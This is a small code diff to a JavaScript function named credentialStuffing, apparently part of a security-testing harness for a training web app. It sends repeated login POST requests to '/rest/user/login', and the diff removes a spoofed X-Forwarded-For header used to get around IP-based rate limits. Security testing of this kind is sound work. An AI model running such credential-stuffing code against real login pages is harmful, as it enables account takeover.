@@ -30,9 +30,6 @@ async function credentialStuffing(targetURL){
         const config = {
             method: 'POST',
             url: targetURL + '/rest/user/login',
-            headers: {
-                'X-Forwarded-For': '1.2.3.4'
-            },
             data : {
                 "email": email ,
                 "password": "notblabla"
@@ -48,9 +45,6 @@ async function credentialStuffing(targetURL){
     const config = {
         method: 'POST',
         url: targetURL + '/rest/user/login',
-        headers: {
-            'X-Forwarded-For': '1.2.3.4'
-        },
         data : {
             "email": "bla@bla.com",
             "password": "blabla"
